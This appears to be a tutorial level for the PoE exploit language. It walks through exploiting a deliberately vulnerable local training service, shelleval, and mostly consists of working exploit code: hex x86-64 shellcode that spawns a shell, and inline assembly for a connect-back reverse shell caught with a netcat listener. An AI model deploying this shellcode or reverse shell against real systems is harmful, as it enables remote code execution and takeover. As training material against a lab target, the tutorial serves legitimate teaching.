Level 04
===

You can run PoE code against remote applications, too. In this tutorial, we are
going to exploit a remote service using PoE, assuming that you have a Linux
machine (or a VM).

First, we will run a vulnerable service, named
[`shelleval`](https://github.com/sangkilc/shelleval), which is a simple C
program that listens on a specific TCP port, and receives any arbitrary data
from the user. The received data will then be considered as code, and the
program will eventually execute the code. That is, if we send a shellcode, then
the program will just spawn a shell for us.

Prepare the program on a Linux machine, and compile it with `make`. In this
tutorial, we are going to use port 50000 to run the program.

```
$ git clone https://github.com/sangkilc/shelleval
$ cd shelleval
$ make
$ ./shelleval 50000
```

## Spawn a Shell with a Shellcode

Now that the service is running, we are going to send a simple shellcode to the
service to spawn a shell. Let's use a 79-byte shellcode for x86-64 Linux:
```
4831d24889d752524889e6b210524889e248ffc74831c0b0340f054885c075f14831f64889f0b0210f0548ffc64080fe0375f04831c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05
```

To do so, write a PoE that looks like below:
```
act exploit():
    bv shellcode = 4831d24889d752524889e6b210524889e248ffc74831c0b0340f054885c075f14831f64889f0b0210f0548ffc64080fe0375f04831c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05hs
    write(shellcode)
    write("ls -la" . "\n") // change this command for your benefit.
    return read(-1)

submit:
    return exploit()
```

The above PoE simply sends the shellcode, and then sends a shell command `ls
-la` followed by a newline. You can change the command for your own purpose,
e.g., `cat flag.txt`, etc. To run the above PoE, you will have to use the `net`
command of `PoE.Replayer`. Specifically, run the following command. Note that
`192.168.56.1` is an IP address that the `shelleval` service is running on.

```
> poe net Level-04.poe 192.168.56.1 50000
...
ascii = {Received shell length: 79 bytes.
total 68
drwxr-xr-x  3 root root  4096 Sep 26 22:00 .
drwx------ 13 root root  4096 Sep 26 22:00 ..
drwxr-xr-x  8 root root  4096 Sep 26 22:00 .git
-rw-r--r--  1 root root 17987 Sep 26 22:00 LICENSE
-rw-r--r--  1 root root    81 Sep 26 22:00 Makefile
-rw-r--r--  1 root root    49 Sep 26 22:00 README.md
-rwxr-xr-x  1 root root  1250 Sep 26 22:00 shellcode.py
-rwxr-xr-x  1 root root 17720 Sep 26 22:00 shelleval
-rw-r--r--  1 root root  2579 Sep 26 22:00 shelleval.c
}
```

## Shellcoding with PoE

PoE also supports inline assembly, which makes shellcoding fun and easy. Suppose
we want to send a connect-back shellcode to the shelleval program. In PoE, we
can easily write it as follows.

```
act exploit():
    bv shellcode = x86-64 {{
        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx
        xor r8, r8
        push 0x2
        pop rdi
        push 0x1
        pop rsi
        push 0x6
        pop rdx
        push 0x29
        pop rax
        syscall
        mov r8, rax
        xor rsi, rsi
        xor r10, r10
        push r10
        mov byte ptr [rsp], 0x2
        mov word ptr [rsp+0x2], %
        mov dword ptr [rsp+0x4], %
        mov rsi, rsp
        push 0x10
        pop rdx
        push r8
        pop rdi
        push 0x2a
        pop rax
        syscall
        xor rsi, rsi
        push 0x3
        pop rsi
    loop:
        dec rsi
        push 0x21
        pop rax
        syscall
        jne loop
        xor rdi, rdi
        push rdi
        push rdi
        pop rsi
        pop rdx
        mov rdi, 0x68732f6e69622f2f
        shr rdi, 0x8
        push rdi
        push rsp
        pop rdi
        push 0x3b
        pop rax
        syscall
    }}: (itoa(le2be(0x7a69)), itoa(p2n("127.0.0.1"))) // port 31337
    write(shellcode)
    return read(-1)

submit:
    return exploit()
```

You can use a special character `%` to indicate an arbitrary string (bitvector)
value, which can be replaced by an argument given to the inline assembly block.
In the above example, there are two arguments given to the assembly block:
`itoa(le2be(0x7a69))` and `itoa(p2n("127.0.0.1"))`, which represent the target
port and ip address, respectively. Note that you can also use a label in the
assembly code.

To run this example, you should first create a netcat server with `nc -l -p
31337` in another terminal as well as the shelleval service. By running the PoE,
the netcat server will receieve a connection with a spawned shell.
